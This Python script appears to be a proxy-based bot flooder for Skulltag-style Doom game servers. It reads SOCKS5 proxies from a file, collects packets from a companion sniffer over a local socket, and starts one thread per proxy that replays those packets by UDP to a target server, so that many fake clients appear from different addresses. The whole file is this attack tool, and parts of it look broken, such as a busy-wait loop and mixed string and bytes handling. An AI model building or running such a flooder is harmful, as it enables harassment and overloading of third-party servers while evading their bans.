import socks
import socket
import threading
import sys
import random
import math
from huffman import *
proxy_ip = []
proxy_port = []
huffman_packets = []
bot_amount = 0
unused_proxy = 0
host = "0.0.0.0"
port = 10684
destination = host, port
huffHost = "127.0.0.1"
huffPort = 4848
huffServer = huffHost, huffPort
#_codec = HuffmanObject(SKULLTAG_FREQS)

class SocksBot(object):
    def getPlayerData(self, nick):
        pDataServer = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        pDataServer.sendto(nick, ("127.0.0.1", 4848))
        pData = pDataServer.recvfrom(1024)
        #print("pData: " + str(sys.getsizeof(pData)))
        return bytes(pData)

    def __init__(self):
        global unused_proxy
        s = socks.socksocket(socket.AF_INET, socket.SOCK_DGRAM)
        pDataServer = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        socks5_ip = proxy_ip[unused_proxy]
        socks5_port = proxy_port[unused_proxy]
        unused_proxy+=1
        print('Initializing bot: '+socks5_ip+'\n')
        s.set_proxy(socks.SOCKS5, socks5_ip, int(socks5_port))
        curPacket = 0
        while True:
            if(curPacket >= len(huffman_packets)):
                continue
            data = bytes(huffman_packets[curPacket])
            s.sendto(bytes(data), destination)
            curPacket += 1
            data = s.recvfrom(8192)
            #print('[+] got ' + str(sys.getsizeof(data)) + 'bytes from: ' + sc_ip +'\n')

class ThreadedServer(object):
    def __init__(self, host, port, bots_amount):
        self.host = host
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.host, self.port))
        for x in range(0, bots_amount):
            if(len(proxy_ip)-1 < int(x)):
                print('Ran out of proxies, true bot amount: ' + str(x) + '\n')
                break
            threading.Thread(target = SocksBot).start()

    def listen(self):
        self.sock.listen(5)
        while True:
            client, address = self.sock.accept()
            client.settimeout(60)
            threading.Thread(target = self.listenToClient, args = (client,address)).start()

    def listenToClient(self, client, address):
        print('Recieved connection from HuffmanSniffer')
        size = 8192
        while True:
            data = client.recv(4)
            if data == "succ":
                 # HuffmanSniffer sending packets to us
                response = data
                client.send("succ") # Confirm that the server is ready
                huffman_packet = client.recv(size)
                huffman_packets.append(huffman_packet)
                print(str(sys.getsizeof(huffman_packet)))
                print('[+] Got packet from HuffmanSniffer')
            else:
                print('[-] HuffmanSniffer died')
                client.close()
                return False

if __name__ == "__main__":
    while True:
        bots_amount = input("Bots amount: ")
        try:
            bots_amount = int(bots_amount)
            break
        except ValueError:
            pass

with open('proxies.txt') as f:
    lines = f.readlines()

for line in lines:
    ip_port = line.split(':')
    proxy_ip.append(ip_port[0])
    proxy_port.append(ip_port[1])
print('Loaded proxies: ' + str(len(proxy_ip)))
ThreadedServer('127.0.0.1', 1337, bots_amount).listen()